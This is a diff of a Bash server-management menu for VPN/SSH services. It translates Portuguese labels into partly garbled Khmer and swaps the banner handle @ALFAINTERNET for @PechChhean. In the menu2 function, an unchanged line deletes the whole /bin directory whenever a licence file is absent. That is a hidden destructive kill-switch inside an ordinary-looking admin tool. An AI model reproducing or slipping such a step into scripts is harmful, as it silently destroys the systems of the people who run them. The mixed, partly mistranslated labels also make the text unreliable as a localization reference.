@@ -193,14 +193,14 @@ function autoexec () {
 }
 #menu2
 menu2 (){
-[[ -e /etc/Plus-torrent ]] && stsf=$(echo -e "\033[1;32m(ON ◉ ") || stsf=$(echo -e "\033[1;31m(OFF ○ ")
-stsbot=$(ps x | grep "bot_plus"|grep -v grep > /dev/null && echo -e "\033[1;32m(ON ◉ " || echo -e "\033[1;31m(OFF ○ ")
-stsbotteste=$(ps x | grep "bot_teste"|grep -v grep > /dev/null && echo -e "\033[1;32m(ON ◉ " || echo -e "\033[1;31m(OFF ○ ")
-stsl=$(ps x | grep "limiter"|grep -v grep > /dev/null && echo -e "\033[1;32m(ON ◉)" || echo -e "\033[1;31m(OFF ○)")
-stsu=$(ps x | grep "udpvpn"|grep -v grep > /dev/null && echo -e "\033[1;32m(ON ◉)" || echo -e "\033[1;31m(OFF ○)")
-stson=$(ps x | grep "onlineapp"|grep -v grep > /dev/null && echo -e "\033[1;32m(ON ◉) " || echo -e "\033[1;31m(OFF ○) ")
-stsom=$(ps x | grep "shutdown -r 16:00"|grep -v grep > /dev/null && echo -e "\033[1;32m(ON ◉) " || echo -e "\033[1;31m(OFF ○) ")
-autm=$(grep "menu;" /etc/profile > /dev/null && echo -e "\033[1;32m(ON ◉) " || echo -e "\033[1;31m(OFF ○)")
+[[ -e /etc/Plus-torrent ]] && stsf=$(echo -e "\033[1;32m(ON ◉ ") || stsf=$(echo -e "\033[1;31m(បិទ ○ ")
+stsbot=$(ps x | grep "bot_plus"|grep -v grep > /dev/null && echo -e "\033[1;32m(ON ◉ " || echo -e "\033[1;31m(បិទ ○ ")
+stsbotteste=$(ps x | grep "bot_teste"|grep -v grep > /dev/null && echo -e "\033[1;32m(ON ◉ " || echo -e "\033[1;31m(បិទ ○ ")
+stsl=$(ps x | grep "limiter"|grep -v grep > /dev/null && echo -e "\033[1;32m(ON ◉)" || echo -e "\033[1;31m(បិទ ○)")
+stsu=$(ps x | grep "udpvpn"|grep -v grep > /dev/null && echo -e "\033[1;32m(ON ◉)" || echo -e "\033[1;31m(បិទ ○)")
+stson=$(ps x | grep "onlineapp"|grep -v grep > /dev/null && echo -e "\033[1;32m(បើក ◉) " || echo -e "\033[1;31m(បិទ ○) ")
+stsom=$(ps x | grep "shutdown -r 16:00"|grep -v grep > /dev/null && echo -e "\033[1;32m(បើក ◉) " || echo -e "\033[1;31m(បិទ ○) ")
+autm=$(grep "menu;" /etc/profile > /dev/null && echo -e "\033[1;32m(បើក ◉) " || echo -e "\033[1;31m(បិទ ○)")
 _swap1=$(free -h | grep -i swap | awk {'print $2'})
 [[ ! -e /usr/lib/licence ]] && rm -rf /bin > /dev/null 2>&1
 if [[ "$(grep -c "Ubuntu" /etc/issue.net)" = "1" ]]; then
@@ -232,39 +232,39 @@ clear
 system=$(cat /etc/issue.net)
 date=$(date '+%Y-%m-%d <> %H:%M:%S')
 echo -e "\033[1;37m $system                          $date"
-echo -e "\033[01;31m║\033[1;31m\033[5;34;47m                               @ALFAINTERNET                                 \033[1;33m \033[0m\033[01;31m║"
+echo -e "\033[01;31m║\033[1;31m\033[5;34;47m                               @PechChhean                                 \033[1;33m \033[0m\033[01;31m║"
 echo -e "\033[1;31m╠━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━━═━═━═━═━═━━═━═━═━═━━━═━═━═━═━═━═━━═━═━═━═━═━\033[0m"
-echo -e "\033[01;31m║\033[1;31m\033[1;32mSISTEMA              |  MEMÓRIA RAM          |  PROCESSADOR "
-echo -e "\033[01;31m║\033[1;31m\033[1;31mOS: \033[1;37m$_system   | \033[1;31mTOTAL:\033[1;37m$_ram      | \033[1;31mNUCLEO: \033[1;37m$_core\033[0m"
-echo -e "\033[01;31m║\033[1;31m\033[1;31mHORÁRIO: \033[1;37m$_hora    | \033[1;31mEM USO: \033[1;37m$_usor      | \033[1;31mEM USO: \033[1;37m$_usop\033[0m"
-echo -e "\033[01;31m║\033[1;31m\033[1;36mBAD-UDP/VPN \033[1;37m $stsu \033[1;37m| \033[1;36mBOT TELEGRAM $stsbot \033[1;37m | \033[1;37m\033[1;36mLIMITADOR SSH \033[1;37m $stsl"
+echo -e "\033[01;31m║\033[1;31m\033[1;32mប្រព័ន្ធ              |  អង្គចងចាំ និង RAM          |  ដំណើរការ "
+echo -e "\033[01;31m║\033[1;31m\033[1;31mOS: \033[1;37m$_system   | \033[1;31mសរុប:\033[1;37m$_ram      | \033[1;31mNUCLEO: \033[1;37m$_core\033[0m"
+echo -e "\033[01;31m║\033[1;31m\033[1;31mម៉ោង: \033[1;37m$_hora    | \033[1;31mEM USO: \033[1;37m$_usor      | \033[1;31mEM USO: \033[1;37m$_usop\033[0m"
+echo -e "\033[01;31m║\033[1;31m\033[1;36mBAD-UDP/VPN \033[1;37m $stsu \033[1;37m| \033[1;36mBOT តេឡេក្រាម $stsbot \033[1;37m | \033[1;37m\033[1;36mSSH LIMITER \033[1;37m $stsl"
 [[ ! -e /tmp/att ]]  && {
-    echo -e "\033[01;31m║\033[1;31m\033[1;32mCONECTADOS:\033[1;37m $_onlin    | \033[1;31mVENCIDOS: \033[1;37m$_userexp       | \033[1;33mCRIADOS: \033[1;37m$_tuser\033[0m"
+    echo -e "\033[01;31m║\033[1;31m\033[1;32mបានភ្ជាប់:\033[1;37m $_onlin    | \033[1;31mបាត់: \033[1;37m$_userexp       | \033[1;33mMAID: \033[1;37m$_tuser\033[0m"
     var01='\033[1;37m•'
 } || {
-    echo -e "\033[01;31m║\033[1;33m[\033[1;31m!\033[1;33m]  \033[1;32mEXISTE UMA ATUALIZACAO DISPONIVEL  \033[1;33m[\033[1;31m!\033[1;33m]\033[0m"
+    echo -e "\033[01;31m║\033[1;33m[\033[1;31m!\033[1;33m]  \033[1;32mមានការអាប់ដេតដែលអាចប្រើបាន  \033[1;33m[\033[1;31m!\033[1;33m]\033[0m"
     var01="\033[1;32m!"
 }
 echo -e "\033[1;31m╠━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━━═━═━═━═━═━━═━═━═━═━━━═━═━═━═━═━═━━═━═━═━═━═━\033[0m"
-echo -e "\033[01;31m║\033[1;31m\033[1;34m[\033[1;37m 16 •\033[1;34m]\033[1;37m ➩ \033[1;33mMONITOR APP $stson \033[0;32m"
-echo -e "\033[01;31m║\033[1;31m\033[1;34m[\033[1;37m 17 •\033[1;34m]\033[1;37m ➩ \033[1;33mBLOQUEAR TORRENT $stsf \033[0;32m"
-echo -e "\033[01;31m║\033[1;31m\033[1;34m[\033[1;37m 18 •\033[1;34m]\033[1;37m ➩ \033[1;33mLIMITADOR $stsl \033[0;32m"
+echo -e "\033[01;31m║\033[1;31m\033[1;34m[\033[1;37m 16 •\033[1;34m]\033[1;37m ➩ \033[1;33mកម្មវិធីត្រួតពិនិត្យ $stson \033[0;32m"
+echo -e "\033[01;31m║\033[1;31m\033[1;34m[\033[1;37m 17 •\033[1;34m]\033[1;37m ➩ \033[1;33mទប់ស្កាត់ TORRENT $stsf \033[0;32m"
+echo -e "\033[01;31m║\033[1;31m\033[1;34m[\033[1;37m 18 •\033[1;34m]\033[1;37m ➩ \033[1;33mLIMITER $stsl \033[0;32m"
 echo -e "\033[01;31m║\033[1;31m\033[1;34m[\033[1;37m 19 •\033[1;34m]\033[1;37m ➩ \033[1;33mBADVPN PRO $stsu \033[0;32m"
-echo -e "\033[01;31m║\033[1;31m\033[1;34m[\033[1;37m 20 •\033[1;34m]\033[1;37m ➩ \033[1;33mAUTO MENU $autm \033[0;32m"
-echo -e "\033[01;31m║\033[1;31m\033[1;34m[\033[1;37m 21 •\033[1;34m]\033[1;37m ➩ \033[1;33mBOT TELEGRAM $stsbot \033[0;32m"
-echo -e "\033[01;31m║\033[1;31m\033[1;34m[\033[1;37m 22 •\033[1;34m]\033[1;37m ➩ \033[1;33mBOT TESTE $stsbotteste \033[0;32m"
-echo -e "\033[01;31m║\033[1;31m\033[1;34m[\033[1;37m 23 •\033[1;34m]\033[1;37m ➩ \033[1;33mBLOQUER SITE\033[1;37m \033[0;32m"
-echo -e "\033[01;31m║\033[1;31m\033[1;34m[\033[1;37m 24 •\033[1;34m]\033[1;37m ➩ \033[1;33mAUTO REBOOT (00:00H) \033[0;32m"
-echo -e "\033[01;31m║\033[1;31m\033[1;34m[\033[1;37m 25 •\033[1;34m]\033[1;37m ➩ \033[1;33mSISTEMA AVANÇADO \033[0;32m"
-echo -e "\033[01;31m║\033[1;31m\033[1;34m[\033[1;37m 26 •\033[1;34m]\033[1;37m ➩ \033[1;33mREINICIAR SERVIDOR\033[0;32m"
-echo -e "\033[01;31m║\033[1;31m\033[1;34m[\033[1;37m 27 •\033[1;34m]\033[1;37m ➩ \033[1;33mREINICIAR SERVIÇOS \033[0;32m"
-echo -e "\033[01;31m║\033[1;31m\033[1;34m[\033[1;37m 28 •\033[1;34m]\033[1;37m ➩ \033[1;33mPAINEL V2RAY \033[0;32m"
-echo -e "\033[01;31m║\033[1;31m\033[1;34m[\033[1;37m 29 •\033[1;34m]\033[1;37m ➩ \033[1;33mSENHA ROOT \033[0;32m"
-echo -e "\033[01;31m║\033[1;31m\033[1;34m[\033[1;37m 30 •\033[1;34m]\033[1;37m ➩ \033[1;33mATUALIZAR SCRIPT \033[1;37m"
-echo -e "\033[01;31m║\033[1;31m\033[1;34m[\033[1;37m 31 •\033[1;34m]\033[1;37m ➩ \033[1;33mREMOVER SCRIPT \033[0;32m"
+echo -e "\033[01;31m║\033[1;31m\033[1;34m[\033[1;37m 20 •\033[1;34m]\033[1;37m ➩ \033[1;33mម៉ឺនុយស្វ័យប្រវត្តិ $autm \033[0;32m"
+echo -e "\033[01;31m║\033[1;31m\033[1;34m[\033[1;37m 21 •\033[1;34m]\033[1;37m ➩ \033[1;33mBOT តេឡេក្រាម $stsbot \033[0;32m"
+echo -e "\033[01;31m║\033[1;31m\033[1;34m[\033[1;37m 22 •\033[1;34m]\033[1;37m ➩ \033[1;33mការធ្វើតេស្ត BOT $stsbotteste \033[0;32m"
+echo -e "\033[01;31m║\033[1;31m\033[1;34m[\033[1;37m 23 •\033[1;34m]\033[1;37m ➩ \033[1;33mដើម្បីទប់ស្កាត់ គេហទំព័រ\033[1;37m \033[0;32m"
+echo -e "\033[01;31m║\033[1;31m\033[1;34m[\033[1;37m 24 •\033[1;34m]\033[1;37m ➩ \033[1;33mចាប់ផ្ដើមឡើងវិញដោយស្វ័យប្រវត្តិ (00:00H) \033[0;32m"
+echo -e "\033[01;31m║\033[1;31m\033[1;34m[\033[1;37m 25 •\033[1;34m]\033[1;37m ➩ \033[1;33mប្រព័ន្ធកម្រិតខ្ពស់ \033[0;32m"
+echo -e "\033[01;31m║\033[1;31m\033[1;34m[\033[1;37m 26 •\033[1;34m]\033[1;37m ➩ \033[1;33mចាប់ផ្តើមម៉ាស៊ីនមេឡើងវិញ\033[0;32m"
+echo -e "\033[01;31m║\033[1;31m\033[1;34m[\033[1;37m 27 •\033[1;34m]\033[1;37m ➩ \033[1;33mចាប់ផ្តើមសេវាកម្មឡើងវិញ \033[0;32m"
+echo -e "\033[01;31m║\033[1;31m\033[1;34m[\033[1;37m 28 •\033[1;34m]\033[1;37m ➩ \033[1;33mPanel V2RAY \033[0;32m"
+echo -e "\033[01;31m║\033[1;31m\033[1;34m[\033[1;37m 29 •\033[1;34m]\033[1;37m ➩ \033[1;33mពាក្យសម្ងាត់ Root \033[0;32m"
+echo -e "\033[01;31m║\033[1;31m\033[1;34m[\033[1;37m 30 •\033[1;34m]\033[1;37m ➩ \033[1;33mធ្វើបច្ចុប្បន្នភាពស្គ្រីប \033[1;37m"
+echo -e "\033[01;31m║\033[1;31m\033[1;34m[\033[1;37m 31 •\033[1;34m]\033[1;37m ➩ \033[1;33mដកស្គ្រីបចេញ \033[0;32m"
 echo -e "\033[1;31m╠━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━━═━═━═━═━═━━═━═━═━═━━━═━═━═━═━═━═━━═━═━═━═━═━\033[0m"
-echo -e "\033[1;31m╚╣\033[5;34;47m║ R ➩ MENU 1 ║ P ➩ MENU 2  ║  V ➩ V2RAY  ║\033[0m"
-echo -ne " \033[1;31m╰━━━━━━━━❪\033[1;32mESCOLHA OPÇÃO DESEJADA\033[1;33m\033[1;31m\033[1;37m : "; read x
+echo -e "\033[1;31m╚╣\033[5;34;47m║ R ➩ ម៉ឺនុយ 1 ║ P ➩ ម៉ឺនុយ 2  ║  V ➩ V2RAY  ║\033[0m"
+echo -ne " \033[1;31m╰━━━━━━━━❪\033[1;32mជ្រើសរើសជម្រើសដែលចង់បាន\033[1;33m\033[1;31m\033[1;37m : "; read x
 case "$x" in
    16)
    clear
@@ -284,7 +284,7 @@ case "$x" in
    ;;
    24)
    clear
-   echo -e "\E[44;1;37m             AUTO REBOOT              \E[0m"
+   echo -e "\E[44;1;37m             ចាប់ផ្ដើមឡើងវិញដោយស្វ័យប្រវត្តិ              \E[0m"
                                 echo -e "\033[1;31mESSA FUNÇÃO ATIVA REINICIALIZAÇÃO AUTOMÁTICA DA TUA VPS \033[1;33m \033[1;32\033[0m"
    echo -e "\033[1;31M ESCOLHA UM HORÁRIO PARA O DESLIGAMENTO EX: \033[1;33m00:00 \033[1;32\033[0m"
 echo -ne "\033[1;32mDIGITE A HORA \033[1;33m\033[1;37m: "
@@ -401,23 +401,23 @@ _hora=$(printf '%(%H:%M:%S)T')
 _onlin=$(printf '%-5s' "$_onli")
 _userexp=$(printf '%-5s' "$_expuser")
 _tuser=$(awk -F: '$3>=1000 {print $1}' /etc/passwd | grep -v nobody | wc -l)
-[[ -e /etc/Plus-torrent ]] && stsf=$(echo -e "\033[1;32m(ON ◉ ") || stsf=$(echo -e "\033[1;31m(OFF ○ ")
-stsbot=$(ps x | grep "bot_plus"|grep -v grep > /dev/null && echo -e "\033[1;32m(ON ◉ " || echo -e "\033[1;31m(OFF ○ ")
-stsbotteste=$(ps x | grep "bot_teste"|grep -v grep > /dev/null && echo -e "\033[1;32m(ON ◉ " || echo -e "\033[1;31m(OFF ○ ")
-stsl=$(ps x | grep "limiter"|grep -v grep > /dev/null && echo -e "\033[1;32m(ON ◉)" || echo -e "\033[1;31m(OFF ○)")
-stsu=$(ps x | grep "udpvpn"|grep -v grep > /dev/null && echo -e "\033[1;32m(ON ◉)" || echo -e "\033[1;31m(OFF ○)")
-stson=$(ps x | grep "onlineapp"|grep -v grep > /dev/null && echo -e "\033[1;32m(ON ◉) " || echo -e "\033[1;31m(OFF ○) ")
-stsom=$(ps x | grep "shutdown -r 16:00"|grep -v grep > /dev/null && echo -e "\033[1;32m(ON ◉) " || echo -e "\033[1;31m(OFF ○) ")
-autm=$(grep "menu;" /etc/profile > /dev/null && echo -e "\033[1;32m(ON ◉) " || echo -e "\033[1;31m(OFF ○)")
+[[ -e /etc/Plus-torrent ]] && stsf=$(echo -e "\033[1;32m(ON ◉ ") || stsf=$(echo -e "\033[1;31m(បិទ ○ ")
+stsbot=$(ps x | grep "bot_plus"|grep -v grep > /dev/null && echo -e "\033[1;32m(ON ◉ " || echo -e "\033[1;31m(បិទ ○ ")
+stsbotteste=$(ps x | grep "bot_teste"|grep -v grep > /dev/null && echo -e "\033[1;32m(ON ◉ " || echo -e "\033[1;31m(បិទ ○ ")
+stsl=$(ps x | grep "limiter"|grep -v grep > /dev/null && echo -e "\033[1;32m(ON ◉)" || echo -e "\033[1;31m(បិទ ○)")
+stsu=$(ps x | grep "udpvpn"|grep -v grep > /dev/null && echo -e "\033[1;32m(ON ◉)" || echo -e "\033[1;31m(បិទ ○)")
+stson=$(ps x | grep "onlineapp"|grep -v grep > /dev/null && echo -e "\033[1;32m(បើក ◉) " || echo -e "\033[1;31m(បិទ ○) ")
+stsom=$(ps x | grep "shutdown -r 16:00"|grep -v grep > /dev/null && echo -e "\033[1;32m(បើក ◉) " || echo -e "\033[1;31m(បិទ ○) ")
+autm=$(grep "menu;" /etc/profile > /dev/null && echo -e "\033[1;32m(បើក ◉) " || echo -e "\033[1;31m(បិទ ○)")
 clear
 system=$(cat /etc/issue.net)
 date=$(date '+%Y-%m-%d <> %H:%M:%S')
 echo -e "\033[1;37m $system                          $date"
-echo -e "\033[01;31m║\033[1;31m\033[5;34;47m                                @ALFAINTERNET                                \033[1;33m \033[0m\033[01;31m║"
+echo -e "\033[01;31m║\033[1;31m\033[5;34;47m                                @PechChhean                                \033[1;33m \033[0m\033[01;31m║"
 echo -e "\033[1;31m╠━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━━═━═━═━═━═━━═━═━═━═━━━═━═━═━═━═━═━━═━═━═━═━═━\033[0m"
-echo -e "\033[01;31m║\033[1;31m\033[1;32mSISTEMA              |  MEMÓRIA RAM          |  PROCESSADOR "
-echo -e "\033[01;31m║\033[1;31m\033[1;31mOS: \033[1;37m$_system   | \033[1;31mTOTAL:\033[1;37m$_ram      | \033[1;31mNUCLEO: \033[1;37m$_core\033[0m"
-echo -e "\033[01;31m║\033[1;31m\033[1;31mHORÁRIO: \033[1;37m$_hora    | \033[1;31mEM USO: \033[1;37m$_usor      | \033[1;31mEM USO: \033[1;37m$_usop\033[0m"
+echo -e "\033[01;31m║\033[1;31m\033[1;32mប្រព័ន្ធ              |  អង្គចងចាំ និង RAM          |  ដំណើរការ "
+echo -e "\033[01;31m║\033[1;31m\033[1;31mOS: \033[1;37m$_system   | \033[1;31mសរុប:\033[1;37m$_ram      | \033[1;31mNUCLEO: \033[1;37m$_core\033[0m"
+echo -e "\033[01;31m║\033[1;31m\033[1;31mម៉ោង: \033[1;37m$_hora    | \033[1;31mEM USO: \033[1;37m$_usor      | \033[1;31mEM USO: \033[1;37m$_usop\033[0m"
 echo -e "\033[01;31m║\033[1;31m\033[1;36mBAD-UDP/VPN \033[1;37m $stsu \033[1;37m| \033[1;36mBOT TELEGRAM $stsbot \033[1;37m | \033[1;37m\033[1;36mLIMITADOR SSH \033[1;37m $stsl"
 [[ ! -e /tmp/att ]]  && {
     echo -e "\033[01;31m║\033[1;31m\033[1;32mCONECTADOS:\033[1;37m $_onlin    | \033[1;31mVENCIDOS: \033[1;37m$_userexp       | \033[1;33mCRIADOS: \033[1;37m$_tuser\033[0m"
